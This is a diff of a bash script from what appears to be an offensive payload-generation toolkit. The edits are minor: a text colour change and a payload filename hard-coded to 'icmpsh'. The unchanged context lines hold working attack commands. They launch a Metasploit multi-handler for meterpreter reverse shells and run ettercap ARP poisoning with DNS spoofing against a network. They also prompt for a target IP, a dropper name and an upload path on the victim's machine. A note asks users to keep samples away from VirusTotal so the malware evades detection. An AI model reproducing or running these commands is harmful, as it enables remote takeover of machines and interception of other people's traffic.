@@ -654,7 +654,7 @@ fi
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
         echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
-        echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
+        echo ${BlueF}[☠]${white} Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
         echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
           if [ "$MsFlF" = "ON" ]; then
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
@@ -683,7 +683,7 @@ fi
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
         echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
-        echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
+        echo ${BlueF}[☠]${white} Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
         echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
           if [ "$MsFlF" = "ON" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
@@ -11410,21 +11410,16 @@ echo "[☠] Enter module settings!"
 lhost=$(zenity --title="☠ Enter LHOST (local ip) ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 target=$(zenity --title="☠ Enter RHOST (target ip) ☠" --text "example: 192.168.1.72" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --title="☠ Enter Dropper FileName ☠" --text "example: dropper" --entry --width 300) > /dev/null 2>&1
-slave=$(zenity --title="☠ Enter Payload FileName ☠" --text "example: icmpsh\nRemark: DONT start the name with [ f ] character .." --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
+
 ## setting default values in case user have skip this ..
+slave="icmpsh"
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$N4m" ]; then N4m="dropper";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
-if [ -z "$slave" ]; then slave="icmpsh";fi
 if [ -z "$target" ]; then
    echo "${RedF}[x]${white} We must provide the [${RedF} target ${white}] ip address ([${RedF}ERR${white}])"
-   sleep 3; sh_exit
-fi
-ext=$(echo $slave|cut -c 1)
-if [ "$ext" = "f" ]; then
-   echo "${RedF}[x]${white} Payload name must NOT start with [${RedF} f ${white}] character ([${RedF}ERR${white}])"
    sleep 3; sh_exit
 fi
 
